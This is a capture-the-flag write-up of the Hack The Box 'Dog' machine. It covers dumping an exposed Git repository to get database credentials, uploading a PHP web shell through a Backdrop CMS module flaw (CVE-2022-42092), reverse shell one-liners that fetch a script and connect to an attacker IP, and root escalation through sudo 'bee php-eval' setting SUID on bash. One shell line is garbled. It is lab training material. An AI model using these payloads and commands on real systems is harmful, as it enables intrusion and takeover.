    # Dog - Hack The Box Write-up

    ## Introduction to the Dog Machine

    **OS:** Linux
    **Difficulty:** Easy
    **Points:** 20
    **Release Date:** 08 Mar 2025

    This machine, "Dog," is an easy CTF involving the enumeration of an exposed Git repository on a web service, the exploitation of an arbitrary file upload vulnerability in Backdrop CMS, and privilege escalation through a misconfigured `sudo` entry for the `bee` tool.

    ---

    ## 1. Port Scanning (Nmap)

    The first step is always an Nmap scan to discover open ports and running services.

    ```bash
    nmap -sC -sV -oA nmap/dog 10.10.11.58
    ```

    **Nmap Results:**

    ```
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    ```
    The scan reveals that ports 22 (SSH) and 80 (HTTP) are open. Port 80 is our primary target for web enumeration.

    *Caption: Initial Nmap scan revealing open SSH and HTTP ports.*

    ---

    ## 2. Web Enumeration (HTTP - Apache)

    We accessed the website at `http://10.10.11.58/`. The home page shows a "Dog" site with the title "Welcome to Dog!" and mentions "Dog obesity" with the indication "Mon, 15/07/2024 - 7:51pm by dogfBackDropSystem". This suggests the site might be running on **Backdrop CMS**.

![Screenshot of the Dog website homepage](/cv-juan/images/dog-htb/website-homepage.png "Dog Website Homepage")
    *Caption: The main page of the Dog website, indicating Backdrop CMS.*

    ### Discovery of an Exposed Git Repository

    A detailed Nmap review or a `dirb`/`gobuster` scan revealed an exposed `.git` directory:

    `http-git: Git repository found`

    This is a critical finding. An exposed Git repository often allows downloading the source code, which can reveal credentials, vulnerabilities, or sensitive information.

    **Downloading the Git Repository:**

    We used `git-dumper` to download the contents of the exposed Git repository.

    ```bash
    git-dumper [http://10.10.11.58/.git/](http://10.10.11.58/.git/) dog_html/
    ```
    *(Note: The PDF shows `http://10.10.11.58/.git/dog_htb/` as an example, but the correct URL to download the repository root would be `http://10.10.11.58/.git/`)*

![Terminal screenshot showing git-dumper command and output](/cv-juan/images/dog-htb/git-dumper.png "Downloading Git Repository")
    *Caption: Using `git-dumper` to pull the exposed Git repository contents.*

    ### Analyzing the Source Code - Database Credentials

    Once the repository was downloaded, we explored the files. We found the database configuration file: `settings.php`.

    ```php
    // File: settings.php
    <?php

    // Main Backdrop CMS configuration file

    // Database configuration
    //
    // Test sites can configure their database by entering the connection string
    // below. If using replica databases or multiple connections, see the
    // advanced database documentation.
    // [https://api.backdropcms.org/database-configuration](https://api.backdropcms.org/database-configuration)
    $database = 'mysql://root:BackDropJ2024052824@127.0.0.1/hackdrop';
    $database_prefix = '';
    ?>
    ```

    Excellent! We found the database credentials:

    * **Username:** `root`
    * **Password:** `BackDropJ2024052824`

![Code snippet of settings.php revealing database credentials](/cv-juan/images/dog-htb/settings-php.png "Database Credentials in settings.php")
    *Caption: The `settings.php` file containing the cleartext database credentials.*

    ### Discovery of Username (tiffany@dog.htb)

    The PDF also mentions searching for the domain name revealed by Nmap (`dog.htb`) within the main folder to obtain a username. The suggested `grep` command was:

    ```bash
    grep -r "dog.htb" .
    ```

    This led to the discovery of the user `tiffany@dog.htb`.

    ---

    ## 3. Accessing the Backdrop CMS Administration Panel

    Now, with the discovered username (`tiffany`) and password (`BackDropJ2024052824`), we attempted to log in to the Backdrop CMS administration panel.

    **Access URL:** `http://10.10.11.58/user/login` (or similar)

    Authentication was successful, and we gained access to the Dashboard of Backdrop CMS.

![Backdrop CMS login page and dashboard after successful login](/cv-juan/images/dog-htb/backdrop-login-dashboard.png "Backdrop CMS Login and Dashboard")
    *Caption: Successfully logged into the Backdrop CMS dashboard.*

    ---

    ## 4. RCE Exploitation (Remote Code Execution) - CVE-2022-42092

    The next step is to search for vulnerabilities in Backdrop CMS. A quick search revealed **CVE-2022-42092**, which describes an Unrestricted File Upload vulnerability in `Backdrop CMS 1.22.0` via the 'themes' section that allows Remote Code Execution (RCE).

    To exploit this, we need two files:

    1.  **`shell.info`:** An info file for the module/theme that deceives the CMS.
    2.  **`shell.php`:** The PHP shell that will allow us to execute commands.

    **Content of `shell.info`:**

    ```
    ; File: shell.info
    type = module
    name = Shell
    description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x
    configure = admin/structure/block
    ; Information added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1789862662
    ```

    **Content of `shell.php` (simple command shell):**

    ```php
    ; File: shell.php
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if(isset($_GET['cmd']))
    {
      system($_GET['cmd']);
    }
    ?>
    </pre>
    </body>
    </html>
    ```

    **Exploitation Steps:**

    1.  **Create a `.tar` file:** We placed `shell.info` and `shell.php` inside a folder (e.g., `shell/`) and then compressed it into a `.tar` file (e.g., `shell.tar`).
    2.  **Upload the file:** We navigated to the module/theme upload section in Backdrop CMS.
        * **URL:** `http://10.10.11.58/admin/modules/install` (or similar, in the `Configuration` -> `Install projects` menu).
        * We uploaded `shell.tar` via the "Upload a module, theme, or layout archive to install" option.
    3.  **Confirm Upload:** The CMS reported "Installation was completed successfully".

![Screenshot of Backdrop CMS module upload interface](/cv-juan/images/dog-htb/module-upload.png "Uploading the malicious module")
    *Caption: The Backdrop CMS interface for uploading a new module/theme.*

    ### Locating the Uploaded Shell

    After the upload, we needed to find where the shell was saved. The PDF indicates that "fuzzing" (directory/file enumeration) was performed with Gobuster.

    ```bash
    gobuster dir -u [http://10.10.11.58/](http://10.10.11.58/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
    ```

    Fuzzing revealed the `modules/` directory, and within it, we could access our shell:

    **Shell URL:** `http://10.10.11.58/modules/shell/shell.php`

    We were able to execute commands via the `cmd` parameter, for example, `http://10.10.11.58/modules/shell/shell.php?cmd=whoami`.

    **Initial User:** `www-data`

 ![Screenshot of the web shell with command execution](/cv-juan/images/dog-htb/web-shell-rce.png "Web Shell Remote Code Execution")
    *Caption: Executing commands via the uploaded web shell.*

    ### Establishing a Reverse Shell

    The "Dog" machine has a script that deletes uploaded files, so an interactive shell is crucial. We set up a local HTTP server and a `netcat` listener to get a reverse shell.

    1.  **On the Attacker Machine (Kali/Parrot):**
        * Start a Netcat listener:
            ```bash
            nc -lvnp 4444
            ```
        * Start a simple HTTP server to serve the reverse shell script:
            ```bash
            python3 -m http.server 5555
            ```

    2.  **From the Web Shell on Dog:**
        * We downloaded and executed a reverse shell script. In this case, we used `curl` to download a `bash` script and execute it. The `bash` script contains the following line:
            ```bash
            bash -i & /dev/tcp/10.10.14.40/4444 0>&1
            ```
            Where `10.10.14.40` is your attacker machine's IP.
        * Command in the web shell:
            ```bash
            curl 10.10.14.40:5555 | bash
            ```
            Or directly:
            ```bash
            bash -c "bash -i >& /dev/tcp/10.10.14.40/4444 0>&1"
            ```

![Terminal screenshot showing Netcat listener receiving a reverse shell](/cv-juan/images/dog-htb/reverse-shell.png "Reverse Shell Connection")
    *Caption: Netcat listener successfully catching a reverse shell from the 'Dog' machine.*

    We received a `www-data` shell on our Netcat listener!

    ---

    ## 5. Privilege Escalation

    Once `www-data`, we enumerated the users on the system.

    ```bash
    www-data@dog:/var/www/html/modules/shell$ ls -l /home
    total 8
    drwxr-xr-x 2 jobert jobert 4096 Apr 20 2025 jobert
    drwxr-xr-x 2 johncusack johncusack 4096 Apr 20 2025 johncusack
    ```

    We found the users `jobert` and `johncusack`.

    Recalling the password `BackDropJ2024052824` we found for `root` from the database, we attempted to `su` to `johncusack` with it.

    ```bash
    www-data@dog:/home$ su johncusack
    Password: BackDropJ2024052824
    johncusack@dog:/home$
    ```

    Success! We have switched to the `johncusack` user.

    ### Escalating to Root with `sudo` and `bee`

    As `johncusack`, we checked the `sudo` permissions:

    ```bash
    johncusack@dog:~$ sudo -l
    [sudo] password for johncusack: BackDropJ2024052824
    Matching Defaults entries for johncusack on dog:
        env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

    User johncusack may run the following commands on dog:
        (ALL : ALL) /usr/local/bin/bee
    ```johncusack` can execute `/usr/local/bin/bee` as any user (ALL) and as root (ALL), without requiring an additional password if already authenticated as `johncusack`.

    The `bee` tool is an executable for Backdrop CMS that allows evaluating PHP code. We can use its `php-eval` subcommand to execute arbitrary PHP code as `root`.

    ```bash
    johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("whoami")'
    root
    ```

    Bingo! We have executed `whoami` as `root`.

 ![Terminal screenshot showing sudo bee php-eval to execute whoami as root](/cv-juan/images/dog-htb/privesc-bee-whoami.png "Sudo Bee PHP Eval")
    *Caption: Using `sudo bee` to execute `whoami` as the root user.*

    To get a persistent root shell, we can use `bee` to set the SUID bit on `/bin/bash`. The SUID bit allows an executable to run with the permissions of the file owner (in this case, `root`), instead of the user executing it.

    ```bash
    johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("chmod u+s /bin/bash")'
    johncusack@dog:~$ ls -l /bin/bash
    -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash
    ```

    The `s` in the permissions (`-rwsr-xr-x`) confirms that the SUID bit is set.

    Now, we simply execute `bash -p` (where `-p` tells `bash` to use the effective permissions of the file, i.e., `root`).

    ```bash
    johncusack@dog:~$ bash -p
    bash-5.0# whoami
    root
    ```

![Terminal screenshot showing bash -p to become root](/cv-juan/images/dog-htb/root-shell.png "Root Shell")
    *Caption: Obtaining a root shell using `bash -p` after setting the SUID bit.*

    We are root!

    ---

    ## Conclusion

    The "Dog" machine was an excellent CTF that covered a variety of attack vectors:

    1.  **Exposed Sensitive Information:** Git repository enumeration to find credentials.
    2.  **Web Application Vulnerability:** RCE exploitation in Backdrop CMS (CVE-2022-42092) via file upload.
    3.  **Shell Management:** Obtaining and maintaining a reverse shell despite file deletion.
    4.  **Privilege Escalation:** Using reused credentials and a misconfigured `sudo` permission for `bee` to gain `root` access.

    This machine highlights the importance of code hygiene, configuration management (especially `sudo` permissions), and web application vulnerability monitoring.
